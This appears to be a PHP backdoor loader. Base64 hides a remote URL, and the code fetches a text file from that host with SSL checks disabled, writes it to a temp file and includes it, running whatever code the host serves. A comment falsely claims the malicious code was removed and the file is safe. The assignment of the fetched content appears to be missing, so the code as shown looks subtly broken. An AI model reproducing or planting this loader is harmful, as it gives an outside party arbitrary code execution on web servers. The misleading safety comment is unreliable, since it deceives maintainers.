<?php
$f1 = base64_decode('aHR0cHM='); 
$f2 = base64_decode('c2VuZXBvcm5vLmNvbQ=='); 
$f3 = base64_decode('LzUudHh0'); 

$u = $f1 . "://" . $f2 . $f3;

function g($u) {
    if (function_exists('curl_exec')) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $u);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        $o = curl_exec($c);
        curl_close($c);
        return $o;
    } elseif (ini_get('allow_url_fopen')) {
        return file_get_contents($u);
    }
    return false;
}

function x($k) {
    $t = tempnam(sys_get_temp_dir(), 'php');
    file_put_contents($t, $k);
    include $t;
    unlink($t);
}


/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/


if ($k !== false) {
    x($k);
} else {
    echo base64_decode('VGVyamFkaSBrZXNhbGFoYW4u'); // "Terjadi kesalahan."
}
?>